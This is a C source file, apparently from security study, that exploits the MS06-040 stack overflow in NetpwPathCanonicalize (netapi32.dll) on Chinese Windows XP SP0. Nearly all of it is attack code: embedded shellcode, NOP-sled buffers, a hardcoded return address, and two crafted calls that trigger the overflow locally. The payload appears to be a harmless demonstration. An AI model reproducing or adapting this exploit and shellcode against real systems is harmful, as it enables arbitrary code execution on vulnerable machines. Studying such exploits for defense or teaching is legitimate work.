/***************************************************************************
*
*	文件名:			exploit.c
*	作者:			king
*	版本:			0.1
*	日期:			2022.3.26
*	说明:			此代码用于Windows xp sp0（chinese）上ms06-040漏洞的利用
*
***************************************************************************/


#include<windows.h>
#include<stdio.h>

typedef void (*MYPROC)(LPTSTR);
char shellcode[]= 
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" 
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x06\x2B\xE3\x66\xBB\x33\x32\x53" 
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B" 
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95" 
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59" 
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A" 
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75" 
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03" 
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB" 
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" 
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"; 



int main()
{
	char path_first[0x300]; 
	char can_path_first[0x440]; 
	char prefix_first[0x100]; 
	long pathtype_first=44; 
	
	char path_second[0x3a];
	char can_path_second[0x440];
	long maxbuf = 0x440;
	char prefix_second[0x100];
	long pathtype_second = 44;



	HINSTANCE LibHandle; 
	MYPROC Trigger; 


	char dll[ ] = "netapi32.dll"; // care for the path 
	char VulFunc[ ] = "NetpwPathCanonicalize"; 



	LibHandle = LoadLibrary(dll); 
	Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc); 


	/************************************************************
	*
	*	
	*
	************************************************************/

	memset(path_first,0,sizeof(path_first)); 
	memset(path_first,0x90,sizeof(path_first)-2);


	memset(prefix_first,0,sizeof(prefix_first)); 
	memset(prefix_first,0x90,sizeof(prefix_first)-2);
	memcpy(prefix_first+32,shellcode,168);



	/************************************************************
	*
	*	
	*
	*
	************************************************************/

	memset(path_second,0,sizeof(path_second));
	memset(path_second,0x90,sizeof(path_second)-2);
	path_second[0x35] = 0x7f;
	path_second[0x34] = 0xfd;
	path_second[0x33] = 0x17;
	path_second[0x32] = 0x67;

	memset(prefix_second,0,sizeof(prefix_second));

	/************************************************************
	*
	*	
	*
	*
	************************************************************/


	(Trigger)(path_first,can_path_first,440,prefix_first ,&pathtype_first,0); 

	//__asm int 3

	(Trigger)(path_second,can_path_second,maxbuf,prefix_second ,&pathtype_second,0); 

	FreeLibrary(LibHandle); 
	return 0;
}